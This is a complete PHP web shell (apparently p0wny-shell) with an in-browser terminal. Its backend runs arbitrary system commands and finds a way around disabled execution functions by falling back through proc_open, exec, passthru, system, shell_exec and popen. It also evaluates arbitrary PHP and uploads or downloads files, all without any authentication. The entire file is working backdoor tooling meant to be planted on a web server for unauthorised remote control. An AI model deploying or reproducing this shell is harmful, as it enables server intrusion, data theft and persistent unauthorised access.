<?php

function featureShell($cmd, $cwd) {
    $return = '';
    $stdout = '';
    $stderr = '';
    $status = '';
    $changed = null;
    if (preg_match("/^\s*cd\s*$/", $cmd)) {
    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
        $changed = array();
        $changed[] = chdir($cwd);
        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        $changed[] = chdir($match[1]);
    } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $cmd)) {
        $changed = array();
        $changed[] = chdir($cwd);
        preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        return featureDownload($match[1]);
    } else {
        $changed = chdir($cwd);
        static $disable_functions;
        if (!isset($disable_functions)) {
            $disable_functions = array_flip(array_map('strtolower', array_map('trim', explode(',', trim(ini_get('disable_functions'))))));
        }
        if (function_exists('proc_open') && is_callable('proc_open') && !isset($disable_functions['proc_open'])) {
            $descriptorspec = array(
                1 => array('pipe', 'w'),
                2 => array('pipe', 'w')
            );
            $pipes = array();
            $proc = proc_open($cmd, $descriptorspec, $pipes);
            if (function_exists('stream_get_contents')) {
                $stdout = stream_get_contents($pipes[1]);
            }
            fclose($pipes[1]);
            if (function_exists('stream_get_contents')) {
                $stderr = stream_get_contents($pipes[2]);
            }
            fclose($pipes[2]);
            if ($proc === false) {
                $status = 1;
            }
            if (function_exists('proc_close')) {
                $status = proc_close($proc);
            }
            if ($stdout === "\x0d\x1b\x5b\x30\x4b\x0a") {
                $stdout = '';
            }
            if ($stdout === '' || $stdout === array() || $stdout === false || $stdout === null) {
                $stdout = 'status='.$status;
                if ($stderr !== '' && $stderr !== array() && $stderr !== false && $stderr !== null) {
                    $stdout .= ' | '.'stderr='.$stderr;
                }
            }
        } elseif (function_exists('exec') && is_callable('exec') && !isset($disable_functions['exec'])) {
            $stdout = array();
            try {
                $return = exec($cmd, $stdout, $status);
            } catch (\Exception $e) {
                $stderr = $e->getMessage();
                $status = $e->getCode();
            }
            if (is_array($stdout)) {
                $stdout = implode(PHP_EOL, $stdout);
            }
            if (!is_numeric($status)) {
                if ($return !== false) {
                    $status = 0;
                } elseif ($return === false) {
                    $status = 1;
                }
            }
            if ($stdout === '' || $stdout === array() || $stdout === false || $stdout === null) {
                $stdout = 'status='.$status;
                if ($stderr !== '' && $stderr !== array() && $stderr !== false && $stderr !== null) {
                    $stdout .= ' | '.'stderr='.$stderr;
                }
            }
        } elseif (function_exists('passthru') && is_callable('passthru') && !isset($disable_functions['passthru'])) {
            if (function_exists('ob_start')) {
                ob_start();
            }
            try {
                $return = passthru($cmd, $status);
            } catch (\Exception $e) {
                $stderr = $e->getMessage();
                $status = $e->getCode();
            }
            if (!is_numeric($status)) {
                if ($return === null) {
                    $status = 0;
                } elseif ($return === false) {
                    $status = 1;
                }
            }
            if (function_exists('ob_get_clean')) {
                $stdout = ob_get_clean();
            }
            if ($stdout === '' || $stdout === array() || $stdout === false || $stdout === null) {
                $stdout = $return;
            }
            if ($stdout === '' || $stdout === array() || $stdout === false || $stdout === null) {
                $stdout = 'status='.$status;
                if ($stderr !== '' && $stderr !== array() && $stderr !== false && $stderr !== null) {
                    $stdout .= ' | '.'stderr='.$stderr;
                }
            }
        } elseif (function_exists('system') && is_callable('system') && !isset($disable_functions['system'])) {
            if (function_exists('ob_start')) {
                ob_start();
            }
            try {
                $return = system($cmd, $status);
            } catch (\Exception $e) {
                $stderr = $e->getMessage();
                $status = $e->getCode();
            }
            if (!is_numeric($status)) {
                if ($return !== false) {
                    $status = 0;
                } elseif ($return === false) {
                    $status = 1;
                }
            }
            if (function_exists('ob_get_clean')) {
                $stdout = ob_get_clean();
            }
            if ($stdout === '' || $stdout === array() || $stdout === false || $stdout === null) {
                $stdout = $return;
            }
            if ($stdout === '' || $stdout === array() || $stdout === false || $stdout === null) {
                $stdout = 'status='.$status;
                if ($stderr !== '' && $stderr !== array() && $stderr !== false && $stderr !== null) {
                    $stdout .= ' | '.'stderr='.$stderr;
                }
            }
        } elseif (function_exists('shell_exec') && is_callable('shell_exec') && !isset($disable_functions['shell_exec'])) {
            $stdout = shell_exec($cmd);
        } elseif (function_exists('popen') && is_callable('popen') && !isset($disable_functions['popen'])) {
            $handle = popen($cmd, 'r');
            if (function_exists('feof') && function_exists('fread')) {
                while (!feof($handle)) {
                    $stdout .= fread($handle, 4096);
                }
            }
            if (function_exists('pclose')) {
                pclose($handle);
            }
        } else {
            $stdout = 'Else';
        }
    }
    if (is_string($stdout)) {
        $stdout = explode(PHP_EOL, $stdout);
    }
    if (!is_array($stdout)) {
        $stdout = array();
    }
    return array(
        'cwd' => getcwd(),
        'stdout' => $stdout,
        'stderr' => $stderr,
        'status' => $status,
        'changed' => $changed,
    );
}

function featurePwd() {
    return array("cwd" => getcwd());
}

function featureHint($fileName, $cwd, $type) {
    if ($type == 'cmd') {
        $cmd = "compgen -c $fileName";
    } else {
        $cmd = "compgen -f $fileName";
    }
    $cmd = "/bin/bash -c \"$cmd\"";
    $files = array();
    $return = '';
    $stdout = '';
    $stderr = '';
    $status = '';
    $changed = null;
    $changed = array();
    $changed[] = chdir($cwd);
    static $disable_functions;
    if (!isset($disable_functions)) {
        $disable_functions = array_flip(array_map('strtolower', array_map('trim', explode(',', trim(ini_get('disable_functions'))))));
    }
    if (function_exists('proc_open') && is_callable('proc_open') && !isset($disable_functions['proc_open'])) {
        $descriptorspec = array(
            1 => array('pipe', 'w'),
            2 => array('pipe', 'w')
        );
        $pipes = array();
        $proc = proc_open($cmd, $descriptorspec, $pipes);
        if (function_exists('stream_get_contents')) {
            $stdout = stream_get_contents($pipes[1]);
        }
        fclose($pipes[1]);
        if (function_exists('stream_get_contents')) {
            $stderr = stream_get_contents($pipes[2]);
        }
        fclose($pipes[2]);
        if ($proc === false) {
            $status = 1;
        }
        if (function_exists('proc_close')) {
            $status = proc_close($proc);
        }
        if ($stdout === "\x0d\x1b\x5b\x30\x4b\x0a") {
            $stdout = '';
        }
    } elseif (function_exists('exec') && is_callable('exec') && !isset($disable_functions['exec'])) {
        $stdout = array();
        try {
            $return = exec($cmd, $stdout, $status);
        } catch (\Exception $e) {
            $stderr = $e->getMessage();
            $status = $e->getCode();
        }
        if (is_array($stdout)) {
            $stdout = implode(PHP_EOL, $stdout);
        }
        if (!is_numeric($status)) {
            if ($return !== false) {
                $status = 0;
            } elseif ($return === false) {
                $status = 1;
            }
        }
    } elseif (function_exists('passthru') && is_callable('passthru') && !isset($disable_functions['passthru'])) {
        if (function_exists('ob_start')) {
            ob_start();
        }
        try {
            $return = passthru($cmd, $status);
        } catch (\Exception $e) {
            $stderr = $e->getMessage();
            $status = $e->getCode();
        }
        if (!is_numeric($status)) {
            if ($return === null) {
                $status = 0;
            } elseif ($return === false) {
                $status = 1;
            }
        }
        if (function_exists('ob_get_clean')) {
            $stdout = ob_get_clean();
        }
        if ($stdout === '' || $stdout === array() || $stdout === false || $stdout === null) {
            $stdout = $return;
        }
    } elseif (function_exists('system') && is_callable('system') && !isset($disable_functions['system'])) {
        if (function_exists('ob_start')) {
            ob_start();
        }
        try {
            $return = system($cmd, $status);
        } catch (\Exception $e) {
            $stderr = $e->getMessage();
            $status = $e->getCode();
        }
        if (!is_numeric($status)) {
            if ($return !== false) {
                $status = 0;
            } elseif ($return === false) {
                $status = 1;
            }
        }
        if (function_exists('ob_get_clean')) {
            $stdout = ob_get_clean();
        }
        if ($stdout === '' || $stdout === array() || $stdout === false || $stdout === null) {
            $stdout = $return;
        }
    } elseif (function_exists('shell_exec') && is_callable('shell_exec') && !isset($disable_functions['shell_exec'])) {
        $stdout = shell_exec($cmd);
    } elseif (function_exists('popen') && is_callable('popen') && !isset($disable_functions['popen'])) {
        $handle = popen($cmd, 'r');
        if (function_exists('feof') && function_exists('fread')) {
            while (!feof($handle)) {
                $stdout .= fread($handle, 4096);
            }
        }
        if (function_exists('pclose')) {
            pclose($handle);
        }
    } else {
        $stdout = 'Else';
    }
    if (is_string($stdout)) {
        $files = explode("\n", $stdout);
    }
    if (!is_array($files)) {
        $files = array();
    }
    return array(
        'cwd' => getcwd(),
        'files' => $files,
        'changed' => $changed,
        'stderr' => $stderr,
        'status' => $status,
    );
}

function featureDownload($filePath) {
    $return = '';
    $stdout = '';
    $stderr = '';
    $status = '';
    $changed = null;
    $file = @file_get_contents($filePath);
    if ($file === false) {
        $error = error_get_last();
        $stdout = array('File not found / no read permission.');
        if (!empty($error['message'])) {
            $stderr = $error['message'];
        }
        $status = 1;
        if (!empty($error['type'])) {
            $status = $error['type'];
        }
        return array(
            'cwd' => getcwd(),
            'stdout' => $stdout,
            'stderr' => $stderr,
            'status' => $status,
        );
    } else {
        return array(
            'name' => basename($filePath),
            'file' => base64_encode($file)
        );
    }
}

function featureUpload($path, $file, $cwd) {
    $return = '';
    $stdout = '';
    $stderr = '';
    $status = '';
    $changed = null;
    $changed = array();
    $changed[] = chdir($cwd);
    $f = @fopen($path, 'wb');
    if ($f === false) {
        $error = error_get_last();
        $stdout = array('Invalid path / no write permission.');
        if (!empty($error['message'])) {
            $stderr = $error['message'];
        }
        $status = 1;
        if (!empty($error['type'])) {
            $status = $error['type'];
        }
        return array(
            'cwd' => getcwd(),
            'stdout' => $stdout,
            'stderr' => $stderr,
            'status' => $status,
            'changed' => $changed,
        );
    } else {
        $writed = null;
        if (is_resource($f)) {
            $writed = fwrite($f, base64_decode($file));
        }
        $closed = null;
        if (is_resource($f)) {
            $closed = fclose($f);
        }
        return array(
            'stdout' => array('Done.'),
            'cwd' => getcwd(),
            'changed' => $changed,
            'writed' => $writed,
            'closed' => $closed,
        );
    }
}

function featureEval($code, $cwd) {
    $return = '';
    $stdout = '';
    $stderr = '';
    $status = '';
    $changed = null;
    if (preg_match("/^\s*cd\s*$/", $code)) {
    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $code)) {
        $changed = array();
        $changed[] = chdir($cwd);
        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $code, $match);
        $changed[] = chdir($match[1]);
    } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $code)) {
        $changed = chdir($cwd);
        preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $code, $match);
        return featureDownload($match[1]);
    } else {
        $changed = array();
        $changed[] = chdir($cwd);
        if (function_exists('ob_start')) {
            ob_start();
        }
        if (substr($code, 0, 5) === '<?php') {
            $code = substr($code, 5);
        } elseif (substr($code, 0, 2) === '<?') {
            $code = substr($code, 2);
        }
        $code .= ';';
        try {
            error_clear_last();
            $return = eval($code);
        } catch (\Exception $e) {
            $stderr = $e->getMessage();
            $status = $e->getCode();
        }
        if (function_exists('ob_get_clean')) {
            $stdout = ob_get_clean();
        }
        if ($stdout === '' || $stdout === array() || $stdout === false || $stdout === null) {
            $stdout = $return;
        }
    }
    if (is_string($stdout)) {
        $stdout = explode(PHP_EOL, $stdout);
    }
    return array(
        'cwd' => getcwd(),
        'stdout' => $stdout,
        'stderr' => $stderr,
        'status' => $status,
        'changed' => $changed,
    );
}

$input_feature = null;
if (!empty($_POST['feature'])) {
    $input_feature = $_POST['feature'];
} elseif (!empty($_COOKIE['feature'])) {
    $input_feature = $_COOKIE['feature'];
} elseif (!empty($_GET['feature'])) {
    $input_feature = $_GET['feature'];
}

if (!empty($input_feature)) {
    $response = NULL;
    switch ($input_feature) {
        case "shell":
            $cmd = $_POST['cmd'];
            if (!preg_match('/2>/', $cmd)) {
                $cmd .= ' 2>&1';
            }
            $response = featureShell($cmd, $_POST["cwd"]);
            break;
        case "pwd":
            $response = featurePwd();
            break;
        case "hint":
            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
            break;
        case 'upload':
            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
            break;
        case 'eval':
            $code = $_POST['code'];
            $code .= ';';
            $response = featureEval($code, $_POST["cwd"]);
            break;
    }
    header("Content-Type: application/json");
    echo json_encode($response);
    die();
}

?><!DOCTYPE html>

<html>

    <head>
        <meta charset="UTF-8" />
        <title>p0wny@shell:~#</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <style>
            html, body {
                margin: 0;
                padding: 0;
                background: #333;
                color: #eee;
                font-family: monospace;
            }

            *::-webkit-scrollbar-track {
                border-radius: 8px;
                background-color: #353535;
            }

            *::-webkit-scrollbar {
                width: 8px;
                height: 8px;
            }

            *::-webkit-scrollbar-thumb {
                border-radius: 8px;
                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);
                background-color: #bcbcbc;
            }

            #shell {
                background: #222;
                max-width: 800px;
                margin: 50px auto 0 auto;
                box-shadow: 0 0 5px rgba(0, 0, 0, .3);
                font-size: 10pt;
                display: flex;
                flex-direction: column;
                align-items: stretch;
            }

            #shell-content {
                height: 500px;
                overflow: auto;
                padding: 5px;
                white-space: pre-wrap;
                flex-grow: 1;
            }

            #shell-logo {
                font-weight: bold;
                color: #FF4180;
                text-align: center;
            }

            @media (max-width: 991px) {
                #shell-logo {
                    font-size: 6px;
                    margin: -25px 0;
                }

                html, body, #shell {
                    height: 100%;
                    width: 100%;
                    max-width: none;
                }

                #shell {
                    margin-top: 0;
                }
            }

            @media (max-width: 767px) {
                #shell-input {
                    flex-direction: column;
                }
            }

            @media (max-width: 320px) {
                #shell-logo {
                    font-size: 5px;
                }
            }

            .shell-prompt {
                font-weight: bold;
                color: #75DF0B;
            }

            .shell-prompt > span {
                color: #1BC9E7;
            }

            #shell-input {
                display: flex;
                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);
                border-top: rgba(255, 255, 255, .05) solid 1px;
            }

            #shell-input > label {
                flex-grow: 0;
                display: block;
                padding: 0 5px;
                height: 30px;
                line-height: 30px;
            }

            #shell-input #shell-cmd {
                height: 30px;
                line-height: 30px;
                border: none;
                background: transparent;
                color: #eee;
                font-family: monospace;
                font-size: 10pt;
                width: 100%;
                align-self: center;
            }

            #shell-input div {
                flex-grow: 1;
                align-items: stretch;
            }

            #shell-input input {
                outline: none;
            }
        </style>

        <script>
            var CWD = null;
            var commandHistory = [];
            var historyPosition = 0;
            var eShellCmdInput = null;
            var eShellContent = null;

            function _insertCommand(command) {
                eShellContent.innerHTML += "\n\n";
                eShellContent.innerHTML += '<span class=\"shell-prompt\">' + genPrompt(CWD) + '</span> ';
                eShellContent.innerHTML += escapeHtml(command);
                eShellContent.innerHTML += "\n";
                eShellContent.scrollTop = eShellContent.scrollHeight;
            }

            function _insertStdout(stdout) {
                eShellContent.innerHTML += escapeHtml(stdout);
                eShellContent.scrollTop = eShellContent.scrollHeight;
            }

            function _defer(callback) {
                setTimeout(callback, 0);
            }

            function featureShell(command) {

                _insertCommand(command);
                if (/^\s*upload\s+[^\s]+\s*$/.test(command)) {
                    featureUpload(command.match(/^\s*upload\s+([^\s]+)\s*$/)[1]);
                } else if (/^\s*clear\s*$/.test(command)) {
                    eShellContent.innerHTML = '';
                } else if (/^\s*eval\s+([\s\S]+)\s*$/.test(command)) {
                    makeRequest("?feature=eval", {code: command.match(/^\s*eval\s+([\s\S]+)\s*$/)[1], cwd: CWD}, function (response) {
                        if (response.hasOwnProperty('file')) {
                            featureDownload(response.name, response.file)
                        } else {
                            _insertStdout(response.stdout.join("\n"));
                            updateCwd(response.cwd);
                        }
                    });
                } else {
                    makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
                        if (response.hasOwnProperty('file')) {
                            featureDownload(response.name, response.file)
                        } else {
                            _insertStdout(response.stdout.join("\n"));
                            updateCwd(response.cwd);
                        }
                    });
                }
            }

            function featureHint() {
                if (eShellCmdInput.value.trim().length === 0) return;

                function _requestCallback(data) {
                    if (data.files.length <= 1) return;

                    if (data.files.length === 2) {
                        if (type === 'cmd') {
                            eShellCmdInput.value = data.files[0];
                        } else {
                            var currentValue = eShellCmdInput.value;
                            eShellCmdInput.value = currentValue.replace(/([^\s]*)$/, data.files[0]);
                        }
                    } else {
                        _insertCommand(eShellCmdInput.value);
                        _insertStdout(data.files.join("\n"));
                    }
                }

                var currentCmd = eShellCmdInput.value.split(" ");
                var type = (currentCmd.length === 1) ? "cmd" : "file";
                var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];

                makeRequest(
                    "?feature=hint",
                    {
                        filename: fileName,
                        cwd: CWD,
                        type: type
                    },
                    _requestCallback
                );

            }

            function featureDownload(name, file) {
                var element = document.createElement('a');
                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);
                element.setAttribute('download', name);
                element.style.display = 'none';
                document.body.appendChild(element);
                element.click();
                document.body.removeChild(element);
                _insertStdout('Done.');
            }

            function featureUpload(path) {
                var element = document.createElement('input');
                element.setAttribute('type', 'file');
                element.style.display = 'none';
                document.body.appendChild(element);
                element.addEventListener('change', function () {
                    var promise = getBase64(element.files[0]);
                    promise.then(function (file) {
                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {
                            _insertStdout(response.stdout.join("\n"));
                            updateCwd(response.cwd);
                        });
                    }, function () {
                        _insertStdout('An unknown client-side error occurred.');
                    });
                });
                element.click();
                document.body.removeChild(element);
            }

            function getBase64(file, onLoadCallback) {
                return new Promise(function(resolve, reject) {
                    var reader = new FileReader();
                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };
                    reader.onerror = reject;
                    reader.readAsDataURL(file);
                });
            }

            function genPrompt(cwd) {
                cwd = cwd || "~";
                var shortCwd = cwd;
                if (cwd.split("/").length > 3) {
                    var splittedCwd = cwd.split("/");
                    shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                }
                return "p0wny@shell:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
            }

            function updateCwd(cwd) {
                if (cwd) {
                    CWD = cwd;
                    _updatePrompt();
                    return;
                }
                makeRequest("?feature=pwd", {}, function(response) {
                    CWD = response.cwd;
                    _updatePrompt();
                });

            }

            function escapeHtml(string) {
                return string
                    .replace(/&/g, "&amp;")
                    .replace(/</g, "&lt;")
                    .replace(/>/g, "&gt;");
            }

            function _updatePrompt() {
                var eShellPrompt = document.getElementById("shell-prompt");
                eShellPrompt.innerHTML = genPrompt(CWD);
            }

            function _onShellCmdKeyDown(event) {
                switch (event.key) {
                    case "Enter":
                        featureShell(eShellCmdInput.value);
                        insertToHistory(eShellCmdInput.value);
                        eShellCmdInput.value = "";
                        break;
                    case "ArrowUp":
                        if (historyPosition > 0) {
                            historyPosition--;
                            eShellCmdInput.blur();
                            eShellCmdInput.value = commandHistory[historyPosition];
                            _defer(function() {
                                eShellCmdInput.focus();
                            });
                        }
                        break;
                    case "ArrowDown":
                        if (historyPosition >= commandHistory.length) {
                            break;
                        }
                        historyPosition++;
                        if (historyPosition === commandHistory.length) {
                            eShellCmdInput.value = "";
                        } else {
                            eShellCmdInput.blur();
                            eShellCmdInput.focus();
                            eShellCmdInput.value = commandHistory[historyPosition];
                        }
                        break;
                    case 'Tab':
                        event.preventDefault();
                        featureHint();
                        break;
                }
            }

            function insertToHistory(cmd) {
                commandHistory.push(cmd);
                historyPosition = commandHistory.length;
            }

            function makeRequest(url, params, callback) {
                function getQueryString() {
                    var a = [];
                    for (var key in params) {
                        if (params.hasOwnProperty(key)) {
                            a.push(encodeURIComponent(key) + "=" + encodeURIComponent(params[key]));
                        }
                    }
                    return a.join("&");
                }
                var xhr = new XMLHttpRequest();
                xhr.open("POST", url, true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4 && xhr.status === 200) {
                        try {
                            var responseJson = JSON.parse(xhr.responseText);
                            callback(responseJson);
                        } catch (error) {
                            alert("Error while parsing response: " + error);
                        }
                    }
                };
                xhr.send(getQueryString());
            }

            document.onclick = function(event) {
                event = event || window.event;
                var selection = window.getSelection();
                var target = event.target || event.srcElement;

                if (target.tagName === "SELECT") {
                    return;
                }

                if (!selection.toString()) {
                    eShellCmdInput.focus();
                }
            };

            window.onload = function() {
                eShellCmdInput = document.getElementById("shell-cmd");
                eShellContent = document.getElementById("shell-content");
                updateCwd();
                eShellCmdInput.focus();
            };
        </script>
    </head>

    <body>
        <div id="shell">
            <pre id="shell-content">
                <div id="shell-logo">
        ___                         ____      _          _ _        _  _   <span></span>
 _ __  / _ \__      ___ __  _   _  / __ \ ___| |__   ___| | |_ /\/|| || |_ <span></span>
| '_ \| | | \ \ /\ / / '_ \| | | |/ / _` / __| '_ \ / _ \ | (_)/\/_  ..  _|<span></span>
| |_) | |_| |\ V  V /| | | | |_| | | (_| \__ \ | | |  __/ | |_   |_      _|<span></span>
| .__/ \___/  \_/\_/ |_| |_|\__, |\ \__,_|___/_| |_|\___|_|_(_)    |_||_|  <span></span>
|_|                         |___/  \____/                                  <span></span>
                </div>
            </pre>
            <div id="shell-input">
                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
                <div>
                    <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
                </div>
            </div>
        </div>
    </body>

</html>
